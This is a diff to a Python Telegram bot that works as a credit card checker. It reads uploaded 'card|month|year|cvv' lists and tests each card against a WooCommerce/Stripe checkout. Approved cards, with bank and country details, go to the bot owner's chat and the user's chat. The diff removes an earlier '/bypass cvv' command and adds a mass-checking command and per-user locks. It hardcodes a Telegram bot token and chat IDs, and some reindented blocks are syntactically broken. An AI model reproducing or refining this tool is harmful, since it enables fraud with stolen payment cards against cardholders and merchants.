@@ -121,7 +121,7 @@ def start(message):
     user_id = message.from_user.id
     
     if is_authorized(user_id):
-        bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝘁𝗵𝗲 𝗠𝗶𝘆𝗲𝗼𝗻 𝗯𝘆𝗽𝗮𝘀𝘀 𝗯𝗼𝘁! 🤗 𝗯𝘆 @itz_shinobu_kocho 𝘂𝘀𝗲 /𝗰𝗺𝗱𝘀 𝘁𝗼 𝘀𝗲𝗲 𝘁𝗵𝗲 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀.")
+        bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝘁𝗵𝗲 𝗯𝗼𝘁! 🤗 𝗯𝘆 @itz_shinobu_kocho 𝘂𝘀𝗲 /𝗰𝗺𝗱𝘀 𝘁𝗼 𝘀𝗲𝗲 𝘁𝗵𝗲 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀.")
     else:
         bot.reply_to(message, "You are not authorized ❌")
     
@@ -130,8 +130,7 @@ def start(message):
 def cmds(message):
     bot.reply_to(message, "Available commands:\n"
                          "/start - Start the bot\n"
-                         "/cmds - List available commands\n"
-                         "/bypass - Bypass cvv")
+                         "/Mass - woo+stripe ccn with file")
     
 # Auth command handler for admins to authorize users
 @bot.message_handler(commands=['auth'])
@@ -148,13 +147,7 @@ def auth(message):
         bot.reply_to(message, "You are not authorized to use this command.")
 
 
-def edit_and_send_message_with_delay(chat_id, message_id, msg):
-    bot.edit_message_text(
-        chat_id=chat_id,
-        message_id=message_id,
-        text=msg
-    )
-    time.sleep(5)
+
 
 def download_file(file_path):
     file_url = f'https://api.telegram.org/file/bot{bot_token}/{file_path}'
@@ -170,40 +163,69 @@ def download_file(file_path):
     
     return full_file_path
 
+
+def edit_and_send_message_with_delay(chat_id, message_id, msg):
+    bot.edit_message_text(
+        chat_id=chat_id,
+        message_id=message_id,
+        text=msg
+    )
+    time.sleep(5)
+file_path = None
+
+
+user_process_status = {}
+user_last_activity_time = {}
+
 @bot.message_handler(commands=['mass'])
 def mass(message):
     global file_path
+    
     # Check if the user is authorized
     user_id = message.from_user.id
     if is_authorized(user_id):
-        if message.reply_to_message and message.reply_to_message.document:
-            if message.reply_to_message.document.mime_type == 'text/plain':
-                file_info = bot.get_file(message.reply_to_message.document.file_id)
-                file_path = download_file(file_info.file_path)
-                start_msg = bot.reply_to(message, 'Your request has been received ✅')
-                
-                edited_messages = [
-                    '[🔴] File uploaded',
-                    '[🟢] Connected to SITE'
-                ]
-                for msg in edited_messages:
-                    edit_and_send_message_with_delay(start_msg.chat.id, start_msg.message_id, msg)
-                
-                process_cards(message)
+        # Check if the user is already running a process
+        if user_process_status.get(user_id):
+            # Check if it's been more than an hour since the last activity
+            if time.time() - user_last_activity_time.get(user_id, 0) >= 3600:
+                # Reset the user's process status
+                user_process_status[user_id] = False
+                bot.reply_to(message, 'Your previous process was reset due to inactivity. You can start a new one.')
             else:
-                bot.reply_to(message, 'Please upload a text file with the extension .txt.')
+                bot.reply_to(message, 'You checking is in progress Please wait until it completes or it will after an hour.')
         else:
-            bot.reply_to(message, 'Please reply to a message that contains a text file.')
+            if message.reply_to_message and message.reply_to_message.document:
+                if message.reply_to_message.document.mime_type == 'text/plain':
+                    file_info = bot.get_file(message.reply_to_message.document.file_id)
+                    file_path = download_file(file_info.file_path)
+                    start_msg = bot.reply_to(message, 'Your request has been received ✅')
+                    chat_id2 = message.chat.id
+
+                    edited_messages = [
+                        '[🔴] File uploaded',
+                        '[🟢] Connected to SITE'
+                    ]
+                    for msg in edited_messages:
+                        edit_and_send_message_with_delay(start_msg.chat.id, start_msg.message_id, msg)
+
+                    # Pass the chat ID to the process_cards function
+                    process_cards(message.chat.id, user_id)
+                else:
+                    bot.reply_to(message, 'Please upload a text file with the extension .txt.')
+            else:
+                bot.reply_to(message, 'Please reply to a message that contains a text file.')
     else:
         bot.reply_to(message, 'You are not authorized to use this command.')
-        
-# Initialize the file_path variable to None
-file_path = None
 
-def process_cards(message):
+# Modify the process_cards function to accept the chat_id and user_id arguments
+def process_cards(chat_id, user_id):
     global file_path
     try:
         if file_path is not None:
+            # Mark the user as running a process and update the last activity time
+            user_process_status[user_id] = True
+            user_last_activity_time[user_id] = time.time()
+
             # Get the total number of CCs to process
             total_cc_count = sum(1 for _ in open(file_path))
             processed_cc_count = 0
@@ -212,30 +234,42 @@ def process_cards(message):
                 for line in file:
                     cc_data = line.strip().split('|')
                     if len(cc_data) == 4:
-                        threading.Thread(target=process_single_cc, args=(cc_data,)).start()
+                        threading.Thread(target=process_single_cc, args=(chat_id, cc_data)).start()
                         
                         # Update the progress message
                         processed_cc_count += 1
-                        progress_message = f'Processing {processed_cc_count}/{total_cc_count} CCs...'
-                        edit_and_send_message_with_delay(message.chat.id, message.message_id, progress_message)
-                        
-                        # Add a delay between starting threads (adjust as needed)
-                        time.sleep(6)
+                        progress_message = f"""[☭] 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 𝗨𝗽𝗱𝗮𝘁𝗲 ✅
+━━━━━━━━━━━━━━━━━━
+⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀: {processed_cc_count}/{total_cc_count} checked 🚀
+━━━━━━━━━━━━━━━━━━
+"""
+                        bot.send_message(chat_id, progress_message)
+                        time.sleep(5)
                 
                 # Final progress message
-                progress_message = f'Processing complete. Checked {processed_cc_count}/{total_cc_count} CCs.'
-                edit_and_send_message_with_delay(message.chat.id, message.message_id, progress_message)
+                progress_message = f"""[☭] 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱 ✅
+━━━━━━━━━━━━━━━━━━
+👍 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱: {processed_cc_count}/{total_cc_count} checked 🚀
+━━━━━━━━"""
+                bot.send_message(chat_id, progress_message)
+                
+                # Mark the user as not running a process
+                user_process_status[user_id] = False
         else:
-            bot.send_message(message.chat.id, 'File not found. Please upload a text file.')
+            bot.send_message(chat_id, 'File not found. Please upload a text file.')
     except Exception as e:
-        bot.send_message(message.chat.id, f'An error occurred: {str(e)}')
+        bot.send_message(chat_id, f'An error occurred: {str(e)}')
+        # Mark the user as not running a process in case of an error
+        user_process_status[user_id] = False
 
 
 bin_info_dict = {}
 
 
-def process_single_cc(cc_data):
+def process_single_cc(chat_id, cc_data):
+    chat_id2 = chat_id
     ccn, month, year, cvv = cc_data
+
     # Initialize the bin_info_dict as an empty dictionary
     bin_info_dict = {}
     print(ccn)
@@ -828,7 +862,7 @@ Content-Disposition: form-data; name="variation_id"
         return
 
     # Your bot's token and chat ID
-    bot_token = '6525917129:AAHRpiJO2_uqYir7TJJQXYnbDCuy4EsDuvI'
+    bot_tokens = '6525917129:AAHRpiJO2_uqYir7TJJQXYnbDCuy4EsDuvI'
     chat_id = '5911292485'
     #chat_id = '-1001938977852'
     
@@ -844,44 +878,44 @@ Content-Disposition: form-data; name="variation_id"
 
     # Check if the condition to send the message is True
     if send.get('condition', True):
-    try:
-        # Choose a random reaction from the list
-        random_reaction = random.choice(reactions)
+            try:
+                # Choose a random reaction from the list
+                random_reaction = random.choice(reactions)
 
-        # OtakuGIFs API endpoint to get a random anime GIF with the chosen reaction
-        otaku_gifs_api_url = 'https://api.otakugifs.xyz/gif'
-        otaku_gifs_params = {
-            'reaction': random_reaction,
-            'format': 'gif'
-        }
+                # OtakuGIFs API endpoint to get a random anime GIF with the chosen reaction
+                otaku_gifs_api_url = 'https://api.otakugifs.xyz/gif'
+                otaku_gifs_params = {
+                    'reaction': random_reaction,
+                    'format': 'gif'
+                }
 
-        # Make a request to the OtakuGIFs API to get a random anime GIF with the chosen reaction
-        response = requests.get(otaku_gifs_api_url, params=otaku_gifs_params)
+                # Make a request to the OtakuGIFs API to get a random anime GIF with the chosen reaction
+                response = requests.get(otaku_gifs_api_url, params=otaku_gifs_params)
 
-        if response.status_code == 200:
-            data = response.json()
-            gif_url = data['url']
+                if response.status_code == 200:
+                    data = response.json()
+                    gif_url = data['url']
 
-            # Initialize the bot
-            bot = telegram.Bot(token=bot_token)
+                    # Initialize the bot
+                    bot = telegram.Bot(token=bot_tokens)
 
-            # Create inline keyboard buttons
-            inline_keyboard = [
-                [
-                    InlineKeyboardButton("🌸 𝗢𝗪𝗡𝗘𝗥", url="https://t.me/Itz_Shinobu_Kocho"),
-                    InlineKeyboardButton("🔮 𝗟𝗔𝗟𝗔𝗟𝗔𝗟𝗜𝗦𝗔", url="https://t.me/tokpmlist_bot")
-                ]
-            ]
+                    # Create inline keyboard buttons
+                    inline_keyboard = [
+                        [
+                            InlineKeyboardButton("🌸 𝗢𝗪𝗡𝗘𝗥", url="https://t.me/Itz_Shinobu_Kocho"),
+                            InlineKeyboardButton("🔮 𝗟𝗔𝗟𝗔𝗟𝗔𝗟𝗜𝗦𝗔", url="https://t.me/tokpmlist_bot")
+                        ]
+                    ]
 
-            # Create an InlineKeyboardMarkup object
-            reply_markup = InlineKeyboardMarkup(inline_keyboard)
+                    # Create an InlineKeyboardMarkup object
+                    reply_markup = InlineKeyboardMarkup(inline_keyboard)
 
-            # Send the first GIF to the specified chat ID (chat_id_1)
-            chat_id_1 = "5911292485"  # Replace with your desired chat ID
-            bot.send_animation(
-                chat_id=chat_id_1,
-                animation=gif_url,
-                caption=f"""**𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗** ✅
+                    # Send the first GIF to the specified chat ID (chat_id_1)
+                    chat_id_1 = "5911292485"
+                    bot.send_animation(
+                        chat_id=chat_id_1,
+                        animation=gif_url,
+                        caption=f"""**𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗** ✅
 ━━━━━━━━━━━━━━━━━━
 💳 **𝗖𝗮𝗿𝗱:** `{ccnd}`
 🚀 **𝗦𝘁𝗮𝘁𝘂𝘀:** {result}
@@ -895,24 +929,37 @@ Content-Disposition: form-data; name="variation_id"
 **𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻** ➜ `{formatted_time}`
 **𝗣𝗿𝗼𝘅𝗶𝗲𝘀** ➜ `Off`
 ━━━━━━━━━━━━━━━━━━""",
-                parse_mode=telegram.ParseMode.MARKDOWN,
-                reply_markup=reply_markup
-            )
+                    parse_mode=telegram.ParseMode.MARKDOWN,
+                    reply_markup=reply_markup
+                )
 
-            # Send the second GIF to the chat ID where the bot is used
-            chat_id_2 = message.chat.id  # This will send the message to the chat where the command was used
-            bot.send_animation(
-                chat_id=chat_id_2,
-                animation=gif_url,
-                caption=message.text,  # Use the existing caption from the message
-                parse_mode=telegram.ParseMode.MARKDOWN,
-                reply_markup=reply_markup
-            )
-        else:
-            print("Failed to fetch a random anime GIF from OtakuGIFs API.")
-    except Exception as e:
-        print(f"An error occurred: {str(e)}")
-        pass
+                    bot = telegram.Bot(token=bot_token)
+                    # Send the second GIF to the chat ID where the bot is used
+                    bot.send_animation(
+                        chat_id=chat_id2,
+                        animation=gif_url,
+                        caption=f"""**𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗** ✅
+━━━━━━━━━━━━━━━━━━
+💳 **𝗖𝗮𝗿𝗱:** `{ccnd}`
+🚀 **𝗦𝘁𝗮𝘁𝘂𝘀:** {result}
+🌐 **𝗚𝗮𝘁𝗲𝘄𝗮𝘆:** 21.90€ Woo+Stripe 
+━━━━━━━━━━━━━━━━━━
+**𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻:**
+  ⩨ **𝗖𝗮𝗿𝗱 𝗧𝘆𝗽𝗲:** {vendor_var} - {type_var} - {level_var}
+  ⩨ **𝗕𝗮𝗻𝗸:** {bank_name_var}
+  ⩨ **𝗖𝗼𝘂𝗻𝘁𝗿𝘆:** {country_var} {flag}
+━━━━━━━━━━━━━━━━━━
+**𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻** ➜ `{formatted_time}`
+**𝗣𝗿𝗼𝘅𝗶𝗲𝘀** ➜ `Off`
+━━━━━━━━━━━━━━━━━━""",
+                    parse_mode=telegram.ParseMode.MARKDOWN,
+                    reply_markup=reply_markup
+                )
+                else:
+                    print("Failed to fetch a random anime GIF from OtakuGIFs API.")
+            except Exception as e:
+                print(f"An error occurred: {str(e)}")
+                pass
         
 if __name__ == '__main__':
     print("Starting bot polling loop...")
